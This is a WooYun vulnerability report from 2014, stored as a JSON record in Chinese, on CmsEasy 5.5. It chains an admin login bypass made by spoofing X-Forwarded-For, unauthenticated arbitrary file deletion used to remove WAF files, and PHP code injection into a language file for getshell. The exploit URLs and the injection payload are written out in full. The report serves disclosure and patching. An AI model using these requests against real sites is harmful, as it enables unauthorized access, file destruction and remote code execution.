{"id": 901, "wybug_id": "wooyun-2014-067762", "wybug_title": "CmsEasy多出任意文件删除到Getshell", "wybug_corp": "cmseasy", "wybug_author": "xfkxfk", "wybug_date": "2014-07-07 20:10", "wybug_open_date": "2014-10-05 20:12", "wybug_type": "非授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "设计缺陷", "敏感接口缺乏认证", "越权操作"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-10：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-05：\t细节向公众公开  简要描述： CmsEasy多出任意文件删除，可直接删除waf，Getshell so Easy ！ 详细说明：  CmsEasy在后台权限验证存在缺陷，导致登陆绕过，以及越权操作后台。1、在后台登陆验证时存在缺陷，导致随意登陆绕过2、在进行后台功能操作时，验证不全，存在缺陷，导致越权操作3、通过上面的问题任意用户，包括非登录用户即可操作后台，危害较大！来看看登陆这里的验证：lib/admin/admin.php文件\n<?phpif (!defined('ROOT')) exit('Can\\'t Access !');abstract class admin extends act {    function __construct() {        if (ADMIN_DIR!=config::get('admin_dir')) {            config::modify(array('admin_dir'=>ADMIN_DIR));            front::flash('后台目录更改成功！');        }        front::$rewrite=false;        parent::__construct();        $servip = gethostbyname($_SERVER['SERVER_NAME']);        //if($this instanceof file_admin && in_array(front::get('act'), array('updialog','upfile','upfilesave','netfile','netfilesave','swfsave'))) return;        if($servip==front::ip()&&front::get('ishtml')==1) return;        $this->check_admin();    }    function check_admin() {        if (cookie::get('login_username')&&cookie::get('login_password')) {            $user=new user();            $user=$user->getrow(array('username'=>cookie::get('login_username')));            $roles = session::get('roles');            if ($roles && is_array($user)&&cookie::get('login_password')==front::cookie_encode($user['password'])) {                $this->view->user=$user;                front::$user=$user;            }else{            \t$user=null;            }        }        if (!isset($user)||!is_array($user)) {            front::redirect(url::create('admin/login'));        }    }}\n主要看这里：\n$servip = gethostbyname($_SERVER['SERVER_NAME']);        //if($this instanceof file_admin && in_array(front::get('act'), array('updialog','upfile','upfilesave','netfile','netfilesave','swfsave'))) return;        if($servip==front::ip()&&front::get('ishtml')==1) return;        $this->check_admin();\n如果gethostbyname($_SERVER['SERVER_NAME'])==front::ip()并且front::get('ishtml')==1，就会return这样正好跳过了下面的check_admin，导致登陆绕过了例如我们在访问后台时：http://localhost/CmsEasy_5.5_UTF-8_20140605/index.php?case=config&act=system&set=site&admin_dir=admin&site=default&ishtml=1然后在访问时拦截包设置header中：X-Forwarded-For: 127.0.0.1，然后访问这样即可访问到后台：\n\n当然在后台进行后台功能操作时，也存在权限和登陆验证的：\nfunction chkpw($str){\tif(!chkpower($str))\t\tfront::alert('无操作权限!');}function chkpower($str){\t$roles = session::get('roles');\t//var_dump($roles);//当前用户的权限\treturn $roles[$str];}\n但是也有存在漏掉的地方，如下面我们要讲的任意文件删除漏洞！附找出全部问题点的技巧！   漏洞证明：  后台搜索unlink，也就是在/lib/admin/目录下搜索：\n\n这里一共找出6处可能存在任意文件删除的漏洞。/file_admin.php中找到两处！/image_admin.php一处/table_admin.php一处/website_admin.php两处。但是/image_admin.php，/table_admin.php，/website_admin.php在删除文件时使用了chkpw函数，进行判断，所以这三个函数不存在漏洞。。。我们来看看第一和第二处：file_admin.php文件\nfunction init() {    }        function delfile_action(){        if(front::$get['UD'] != 1){            echo '2';exit;        }        if(front::$get['dfile'] == ''){            echo '0';exit;        }        $f = str_ireplace(config::get('site_url'), '', front::$get['dfile']);        if(@unlink(ROOT . '/'.$f)){            echo 1;        }else{            echo 0;        }        exit;    }\n首先看看这里的初始化函数中以及操作函数中，都没有判断权限及登陆验证未验证chkpw，导致了越权操作。来看看delfile_action函数：这里直接删除了网站根目录下的文件：\n$f = str_ireplace(config::get('site_url'), '', front::$get['dfile']);        if(@unlink(ROOT . '/'.$f)){            echo 1;        }else{            echo 0;        }\n没有经过任何过滤处理，导致任意文件删除。首先来看看网站根目录下的robots.txt文件是存在的然后我们来构造删除：链接：http://localhost/CmsEasy_5.5_UTF-8_20140605/index.php?case=file&act=delfile&admin_dir=admin&site=default&UD=1&dfile=robots.txt&ishtml=1header：X-Forwarded-For: 127.0.0.1\n\n现在网站根目录下的robots.txt文件已经被删除了：\n\n这里可直接服务器上任意文件，没有任何限制可以直接删除waf文件：http://localhost/CmsEasy_5.5_UTF-8_20140605/index.php?case=file&act=delfile&admin_dir=admin&site=default&UD=1&dfile=webscan360/360safe/360webscan.php&ishtml=1http://localhost/CmsEasy_5.5_UTF-8_20140605/index.php?case=file&act=delfile&admin_dir=admin&site=default&UD=1&dfile=webscan360/360safe/360scan.php&ishtml=1设置header：X-Forwarded-For: 127.0.0.1\n\n至于/file_admin.php中的第二处文件是一样的方法，不在分析了。================================================================================删除waf后，就可以干其他很多事情了。。。下面我们来看看删除waf后，Getshell!文件/lib/admin/language_admin.php：\nfunction init() {    }    function add_action() {        if (front::post('submit')) {            $path=ROOT.'/lang/'.config::get('lang_type').'/system.php';            $tipspath=ROOT.'/lang/cn/system.php';            $content=file_get_contents($path);            $tipscontent=file_get_contents($tipspath);            $replace=\"'\".front::$post['key'].\"'=>'\".front::$post['val'].\"',\";            $tipsreplace=\"'\".front::$post['key'].\"'=>'\".front::$post['cnnote'].\"',\";            $content=str_replace(');',$replace.');',$content);            file_put_contents($path,$content);            $pos=strpos($tipscontent,$tipsreplace);            if (config::get('lang_type') != 'cn'&&$pos === false) {                $tipscontent=str_replace(');',$tipsreplace.');',$tipscontent);                file_put_contents($tipspath,$tipscontent);            }            if ($_GET['site'] != 'default') {                $ftp=new nobftp();                $ftpconfig=config::get('website');                $ftp->connect($ftpconfig['ftpip'],$ftpconfig['ftpuser'],$ftpconfig['ftppwd'],$ftpconfig['ftpport']);                $ftperror=$ftp->returnerror();                if ($ftperror) {                    exit($ftperror);                }                else {                    $ftp->nobchdir($ftpconfig['ftppath']);                    $ftp->nobput($ftpconfig['ftppath'].'/lang/'.config::get('lang_type').'/system.php',$path);                }            }            event::log('添加语言包','成功');            echo '<script type=\"text/javascript\">alert(\"操作完成！\");window.location.href=\"'.url('language/edit',true).'\";</script>';            //exit;            //front::refresh(url('language/edit',true));        }    }\n初始化函数和add_action函数大都未进行登录及权限验证，导致越权操作这里先$content=file_get_contents($path);然后再$content=str_replace(');',$replace.');',$content);最后再file_put_contents($tipspath,$tipscontent);前面我们已经删除了waf，这样我们可以post任意内容到content了发送请求：\n连接：http://localhost/CmsEasy_5.5_UTF-8_20140605/index.php?case=file&act=delfile&admin_dir=admin&site=default&UD=1&dfile=webscan360/360safe/360webscan.php&ishtml=1post：submit=1&key=login&val=111111');phpinfo();//\n\n\n然后，看看/lang/cn/system.php:\n\n   修复方案：  后台严格验证权限及登录验证！   版权声明：转载请注明来源 xfkxfk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-07-07 23:58 厂商回复： 感谢，立即更新 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-07 20:11 |    \t\t魇 \t\t\t( 普通白帽子  |\t\t\t        Rank:1207 漏洞数:104        | 传闻中魇是一个惊世奇男子，但是除了他华...)\t\t \n  你关注的白帽子 xfkxfk 发表了漏洞 CmsEasy任意文件删除可直接删除waf给力    \n     2014-07-07 20:26 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  真给力    \n     2014-07-07 21:33 |    \t\thuc-ray \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:7        | 菜鸟一枚)\t\t \n  留名    \n     2014-07-07 22:06 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  洞主又在刷钱了    \n     2014-07-07 22:11 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  删除360规则文件？    \n     2014-07-07 22:17 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  好好学习一年, 求留洞。    \n     2014-07-07 22:23 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  @′  雨。 加油    \n     2014-07-07 22:23 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  cmseasy要被你们玩坏了……    \n     2014-07-08 09:24 |    \t\t毕月乌 \t\t\t( 普通白帽子  |\t\t\t        Rank:120 漏洞数:16        | 猜猜我是谁？)\t\t \n  给力    \n     2014-07-08 09:26 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  @疯狗 @xsser @finger 我编辑后的内容请审核下，辛苦啦！    \n     2014-07-11 09:44 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  @xfkxfk 洞主你在乌云拿到这么多钱，排行榜上升到第二是采用了什么加速的    \n     2014-10-06 00:35 |    \t\t小小鸟 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:6        | 小白一个)\t\t \n  @泳少 网易UU加速器2333333    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}